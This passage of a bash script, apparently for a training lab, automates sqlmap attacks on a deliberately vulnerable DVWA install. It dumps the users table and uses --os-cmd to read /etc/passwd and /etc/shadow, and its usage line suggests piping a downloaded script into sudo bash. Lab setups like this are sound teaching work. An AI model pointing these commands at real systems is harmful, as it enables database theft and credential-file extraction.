# Provides sample sqlmap commands for basic SQL injection attacks against DVWA.
kali_demonstrate_sqlmap_sqli() {
    print_title "Running SQLmap SQL Injection Scans"

    # --- Step 1: Validate Environment Variables ---
    if [ -z "${DVWA_TARGET_URL:-}" ]; then
        print_error "DVWA_TARGET_URL environment variable is not set."
        print_info "Please run the script like: DVWA_TARGET_URL=\"http://<IP>\" sudo -E bash -s kali_sqlmap_sqli"
        exit 1
    fi
    if [ -z "${DVWA_PHPSESSID:-}" ]; then
        print_error "DVWA_PHPSESSID environment variable is not set."
        print_info "Please run the script like: DVWA_PHPSESSID=\"<ID>\" DVWA_TARGET_URL=\"http://<IP>\" sudo -E bash -s kali_sqlmap_sqli"
        exit 1
    fi
    print_info "Using DVWA Target URL: ${DVWA_TARGET_URL}"
    print_info "Using PHPSESSID: ${DVWA_PHPSESSID}"
    echo ""
    # --- End Validation ---

    local TARGET="${DVWA_TARGET_URL%/}" # Sanitize URL to remove trailing slash
    local PHPSESSID="$DVWA_PHPSESSID"
    local TARGET_USER=$(logname 2>/dev/null || echo "$SUDO_USER")
    local USER_HOME=$(eval echo "~${TARGET_USER}")
    local OUTDIR="${USER_HOME}/scans/dvwa/sqlmap_sqli"
    
    # Prepare output directory and ensure correct ownership
    sudo mkdir -p "$OUTDIR"
    sudo chown -R "$TARGET_USER":"$TARGET_USER" "$OUTDIR"

    # --- Step 2: Define Base Command and Run Scans ---
    local SQLI_URL="${TARGET}/dvwa/vulnerabilities/sqli/?id=1&Submit=Submit"
    local COOKIE_STRING="PHPSESSID=${PHPSESSID}; security=low"
    
    # Base command for all sqlmap executions. --batch is critical for non-interactive runs.
    local SQLMAP_BASE_CMD="sqlmap -u \"${SQLI_URL}\" --cookie=\"${COOKIE_STRING}\" --batch --level=1 --risk=1 --output-dir=\"${OUTDIR}\""

    # Scan 1: List Databases
    local DBS_LOG="${OUTDIR}/1_databases_list.log"
    print_info "Running sqlmap to list databases... Log: ${DBS_LOG}"
    if sudo -u "$TARGET_USER" bash -c "${SQLMAP_BASE_CMD} --dbs" > "${DBS_LOG}" 2>&1; then
        print_success "Successfully listed databases."
    else
        print_error "Failed to list databases. Check the log file for details."
    fi
    echo ""

    # Scan 2: List Tables from 'dvwa' database
    local TABLES_LOG="${OUTDIR}/2_tables_list.log"
    print_info "Running sqlmap to list tables from 'dvwa' database... Log: ${TABLES_LOG}"
    if sudo -u "$TARGET_USER" bash -c "${SQLMAP_BASE_CMD} -D dvwa --tables" > "${TABLES_LOG}" 2>&1; then
        print_success "Successfully listed tables."
    else
        print_error "Failed to list tables. Check the log file for details."
    fi
    echo ""

    # Scan 3: List Columns from 'users' table
    local COLUMNS_LOG="${OUTDIR}/3_columns_list.log"
    print_info "Running sqlmap to list columns from 'users' table... Log: ${COLUMNS_LOG}"
    if sudo -u "$TARGET_USER" bash -c "${SQLMAP_BASE_CMD} -D dvwa -T users --columns" > "${COLUMNS_LOG}" 2>&1; then
        print_success "Successfully listed columns."
    else
        print_error "Failed to list columns. Check the log file for details."
    fi
    echo ""

    # Scan 4: Dump data from 'users' table
    local DUMP_LOG="${OUTDIR}/4_users_dump.log"
    print_info "Running sqlmap to dump data from 'users' table... Log: ${DUMP_LOG}"
    if sudo -u "$TARGET_USER" bash -c "${SQLMAP_BASE_CMD} -D dvwa -T users --dump" > "${DUMP_LOG}" 2>&1; then
        print_success "Successfully dumped user data."
    else
        print_error "Failed to dump user data. Check the log file for details."
    fi
    echo ""

    print_success "All SQLmap scans have been executed. Check the logs in ${OUTDIR} for detailed results."
}

# Function: kali_exploit_sqlmap_os_shell
# Attempts to get an OS shell on DVWA VM via sqlmap and extracts sensitive files.
kali_exploit_sqlmap_os_shell() {
    print_title "Running SQLmap OS Shell Exploitation"

    # --- Step 1: Validate Environment Variables ---
    if [ -z "${DVWA_TARGET_URL:-}" ]; then
        print_error "DVWA_TARGET_URL environment variable is not set."
        print_info "Please run the script like: DVWA_TARGET_URL=\"http://<IP>\" sudo -E bash -s kali_os_shell"
        exit 1
    fi
    if [ -z "${DVWA_PHPSESSID:-}" ]; then
        print_error "DVWA_PHPSESSID environment variable is not set."
        print_info "Please run the script like: DVWA_PHPSESSID=\"<ID>\" DVWA_TARGET_URL=\"http://<IP>\" sudo -E bash -s kali_os_shell"
        exit 1
    fi
    print_info "Using DVWA Target URL: ${DVWA_TARGET_URL}"
    print_info "Using PHPSESSID: ${DVWA_PHPSESSID}"
    echo ""

    # --- Setup Directories and Variables ---
    local TARGET="${DVWA_TARGET_URL%/}" # Sanitize URL
    local PHPSESSID="$DVWA_PHPSESSID"
    local TARGET_USER=$(logname 2>/dev/null || echo "$SUDO_USER")
    local USER_HOME=$(eval echo "~${TARGET_USER}")
    local OUTDIR="${USER_HOME}/scans/dvwa/os_shell_root"

    # Prepare output directory and ensure correct ownership
    sudo mkdir -p "$OUTDIR"
    sudo chown -R "$TARGET_USER":"$TARGET_USER" "$OUTDIR"

    print_warn "This exploit requires the DVWA VM to be running a vulnerable MySQL version (e.g., 5.5 in Docker) and for the DVWA directory to be world-writable (ugo+rw)."
    print_warn "Ensure you have already run the 'mysql50' and 'set_permissions_ubuntu' arguments on the Ubuntu VM."
    
    # Define target URL and cookies
    local SQLI_URL="${TARGET}/dvwa/vulnerabilities/sqli/?id=1&Submit=Submit"
    local COOKIE_STRING="Cookie: security=low; PHPSESSID=${PHPSESSID}"
  
    # Use a bash array for robust argument handling
    # "--answers=follow-redirects=Y,merge-cookies=Y,language=4"
    declare -a SQLMAP_BASE_ARGS=(
        "-u" "${SQLI_URL}"
        "-H" 
        "${COOKIE_STRING}"
        "--batch"
        "--flush-session"
        "--level=5" "--risk=3"
        "--dbs"
        "--dbms=mysql"
        "--os=Linux"
        "--random-agent"
        "--web-root=/var/www/html/dvwa"
        "--output-dir=${OUTDIR}"
    )
    
    # --- Commands to Run ---
    declare -a COMMANDS_TO_RUN=("id" "pwd" "whoami" "sudo cat /etc/passwd" "sudo cat /etc/shadow")

    for CMD in "${COMMANDS_TO_RUN[@]}"; do
        local CMD_SLUG=$(echo "$CMD" | tr -d ' /') # Safe filename
        local CMD_LOG="${OUTDIR}/${CMD_SLUG}.log"
        local CMD_OUTPUT="${OUTDIR}/${CMD_SLUG}.out"

        print_info "Running '${CMD}' via sqlmap --os-cmd"
        
        # Run sqlmap and save full output (stdout + stderr) to log file
        set +e
        sudo -u "$TARGET_USER" sqlmap "${SQLMAP_BASE_ARGS[@]}" --os-cmd="${CMD}" > "$CMD_LOG" 2>&1
        local SQLMAP_EXIT_CODE=$?
        set -e

        if [ "$SQLMAP_EXIT_CODE" -eq 0 ]; then
            print_success "sqlmap completed for '${CMD}' (exit code 0)."
            # --- SURGICAL EDIT START ---
            # Replaced the previous simple parser with a more robust version that handles
            # multiple sqlmap output formats for the --os-cmd output.
            echo "--- Output for '${CMD}' ---"
            
            # Case 1: Handle block-style output like "command output:\n  root"
            if grep -q "command output:" "$CMD_LOG"; then
				sudo awk '/command output:/ {flag=1; next} /\[\*\] ending|\[INFO\] fetched/ {flag=0} {if(flag){print "\033[31m" $0 "\033[0m"}}' "$CMD_LOG"
            # Case 2: Handle line-style output like "[INFO] the command standard output is:\n[INFO] 'root'"
            elif grep -q "command standard output" "$CMD_LOG"; then
                # --- SURGICAL EDIT: Added color codes to the awk print statement ---
                # This awk command finds the marker, gets the next line, cleans it, and prints it in RED.
				# sudo awk '/command standard output/ {getline; sub(/\[INFO\] /, ""); sub(/^\s*'\''/, ""); sub(/''\''\s*$/, ""); print "\033[1;31m" $0 "\033[0m"}' "$CMD_LOG"
                awk '
				/command standard output:/ {
				  # Extract the rest of the line after the colon
				  rest = substr($0, index($0,$3))
				  # Check if rest contains output within quotes
				  if (match(rest, /'\''.*'\''/)) {
				    output = substr(rest, RSTART+1, RLENGTH-2)
				    print "\033[1;31m" output "\033[0m"
				  } else {
				    # For multi-line output, grab next line and see if '---'
				    getline nextline
				    if (nextline == "---") {
				      # Print multi-line output until closing ---
				      while (getline line) {
				        if (line == "---") break
				        print "\033[1;31m" line "\033[0m"
				      }
				    } else {
				      # No output found
				      print "No command standard output found or output missing"
				    }
				  }
				}
				' "$CMD_LOG"
			# Case 3: Fallback for unknown formats if parsing fails
            else
                print_warn "Could not find standard output pattern. Displaying key log lines:"
                sudo grep -E "vulnerable|error|failed|output" "$CMD_LOG" | tail -n 20
            fi
            
            echo "--------------------------"
        else
            print_error "sqlmap failed for '${CMD}' with exit code $SQLMAP_EXIT_CODE."
            print_info "Check full log: ${CMD_LOG}"
        fi

        echo ""
    done

    print_success "All SQLmap OS shell commands have been attempted."
    print_info "Check full logs and outputs in: ${OUTDIR}"
}

# Function to display the final signature
print_signature() {
    echo -e "\n\033[92mCreated with ♡, Harsha\033[0m\n"
}

### === MAIN LOGIC === ###
case "${1:-}" in
    # Ubuntu DVWA VM Arguments
    "dvwa")
        print_info "Detected 'dvwa' argument. Proceeding with DVWA Ubuntu VM installation (SSH + DVWA with Apache2, and Modern MySQL)."
        ubuntu_install_ssh
        ubuntu_install_dvwa_apache_mysql
        print_success "[✔] Full SSH + DVWA (Apache2, Modern MySQL) installation complete on Ubuntu VM."
        print_signature
        ;;
    "mysql50")
        print_info "Detected 'mysql50' argument. Proceeding with Dockerized MySQL 5.5 installation on DVWA Ubuntu VM."
        ubuntu_install_mysql_docker_vulnerable # Call the new Docker function
        print_success "[✔] Dockerized MySQL 5.5 installation complete on Ubuntu VM."
        print_signature
        ;;
    "set_permissions_ubuntu")
        print_info "Detected 'set_permissions_ubuntu' argument. Proceeding to set DVWA directory permissions on Ubuntu VM."
        ubuntu_set_dvwa_permissions
        print_success "[✔] DVWA directory permissions set on Ubuntu VM."
        print_signature
        ;;

    # Kali VM Arguments
    "kali_prereqs")
        print_info "Detected 'kali_prereqs' argument. Proceeding with Kali attack tools prerequisite installation."
        kali_install_tools_prerequisites
        print_success "[✔] Kali attack tools prerequisites installation complete."
        print_signature
        ;;
    "kali_web_scan")
        print_info "Detected 'kali_web_scan' argument. Proceeding to run web content scanners on Kali VM."
        kali_run_web_content_scanners
        print_success "[✔] Web content scanning demonstration complete."
        print_signature
        ;;
    "kali_brute_force")
        print_info "Detected 'kali_brute_force' argument. Providing brute-force attack instructions for Kali VM."
        kali_demonstrate_brute_force
        print_success "[✔] Brute-force attack instructions provided."
        print_signature
        ;;
    "kali_chromium")
        print_info "Detected 'kali_chromium' argument. Proceeding to launch a proxied Chromium browser."
        kali_launch_burp_chromium
        print_success "[✔] Chromium launch process complete."
        print_signature
        ;;
    "kali_vuln_scan")
        print_info "Detected 'kali_vuln_scan' argument. Providing vulnerability scanner instructions for Kali VM."
        kali_demonstrate_vuln_scanners
        print_success "[✔] Vulnerability scanner instructions provided."
        print_signature
        ;;
    "kali_sqlmap_sqli")
        print_info "Detected 'kali_sqlmap_sqli' argument. Providing sqlmap SQLi demonstration for Kali VM."
        kali_demonstrate_sqlmap_sqli
        print_success "[✔] SQLmap SQLi demonstration provided."
        print_signature
        ;;
    "kali_os_shell")
        print_info "Detected 'kali_os_shell' argument. Proceeding with sqlmap OS shell exploitation on Kali VM."
        kali_exploit_sqlmap_os_shell
        print_success "[✔] SQLmap OS shell exploitation guidance provided."
        print_signature
        ;;
    *)
        print_error "Invalid argument: $1"
        echo "Usage: wget -qO- <script_url> | sudo bash [-s <argument>]"
        echo ""
        echo "Arguments for Ubuntu DVWA VM:"
        echo "  dvwa                  : Install SSH, DVWA (Apache2+Modern MySQL)"
        echo "  mysql50               : Downgrade DVWA's database to MySQL 5.5 via Docker"
        echo "  set_permissions_ubuntu: Set DVWA directory to be world-writable (for os-shell exploit)"
        echo ""
        echo "Arguments for Kali VM (ensure DVWA Ubuntu VM is accessible):"
        echo "  kali_prereqs          : Install common attack tools"
        echo "  kali_web_scan         : Run dirb and gobuster web content scanners"
        echo "  kali_brute_force      : Demonstrate brute-force with Burp/Hydra"
        echo "  kali_chromium         : Launch a proxied Chromium browser"
        echo "  kali_vuln_scan        : Demonstrate vulnerability scanning with ZAP/OpenVAS"
        echo "  kali_sqlmap_sqli      : Demonstrate basic SQL injection with sqlmap"
        echo "  kali_os_shell         : Attempt OS shell with sqlmap and extract files"
        exit 1
        ;;
esac
